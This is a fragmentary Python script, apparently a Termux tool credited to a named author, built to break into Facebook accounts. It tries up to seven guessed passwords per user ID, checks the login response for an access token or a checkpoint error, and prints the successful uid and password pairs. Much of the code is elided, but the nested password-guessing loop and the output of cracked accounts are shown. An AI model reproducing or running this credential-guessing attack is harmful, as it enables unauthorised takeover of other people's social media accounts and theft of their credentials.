...
if not os.path.isfile("/data/data/com.termux/files/home/Hk-pro/...../node_modules/bytes/index.js"):
...
elif os.path.isfile("/data/data/com.termux/files/home/Hk-pro/...../node_modules/bytes/index.js"):
...
\_$$  _|\__$$  __|$$ |  $$ |      $$ |  $$ |$$ |  $$ |\____$$  |\_$$  _|
  ...
  $$ |     $$ |   $$  /\$$\       $$ |  $$ |$$ |  $$ | $$  /      $$ |  
$$$$$$\    $$ |   $$ /  $$ |      $$ |  $$ |\$$$$$$  |$$$$$$$$\ $$$$$$\ 
\______|   \__|   \__|  \__|      \__|  \__| \______/ \________|\______|
                                                                                                                                                                                                                                                   
\033[1;91m-----------------------------------------------
\033[1;92m AUTHOR iZ : HUZAIFA PAKTOON
\033[1;92m INSTAGRAM : they_callmehuzaifa
\033[1;91m-----------------------------------------------
\033[1;92m  fb : 
\033[1;92m https://www.facebook.com/MR.HUZAIFA.KHANXXX
\033[1;91m-----------------------------------------------
\033[1;91m-----------------------------------------------                           
...
def main_select():
    ...
    Hk = raw_input("\033[1;97m[#] Choose Opition --->\033[1;96m ")
...
def login_select():
    ...
    Hk = raw_input(" \033[1;97m Choose Option :\033[1;96m ")
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;93m[HK>CP] "+uid+" = "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[HK= OK] "+uid+" = "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[HK>CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[HK= OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[HK>CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[HK= OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;93m[HK>CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[HK= OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;93m[HK>CP] "+uid+" = "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[HK= OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;93m[HK>CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;97m[HK= OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;93m[HK>CP] "+uid+" = "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;97m[HK= OK] "+uid+" = "+pass7+"\x1b[1;0m")
